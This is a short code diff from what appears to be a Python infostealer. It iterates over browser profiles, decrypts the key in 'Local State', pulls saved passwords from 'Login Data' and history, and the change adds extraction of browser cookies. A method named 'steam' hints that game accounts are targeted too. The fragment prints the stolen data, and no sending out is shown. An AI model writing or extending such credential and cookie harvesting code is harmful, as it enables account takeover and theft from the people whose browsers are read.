@@ -26,8 +26,8 @@ class Main:
                 extraction = extractor.Extract(os.path.join(browser, "Local State"))
                 passwds = extraction.extractPasswords(os.path.join(browser, "Login Data"))
                 history = extraction.extractHistory(os.path.join(browser, "History"))
-                print(passwds)
-                print(history)
+                cookies = extraction.extractCookies(os.path.join(browser))
+                print(cookies)
 
 
     def steam(self):
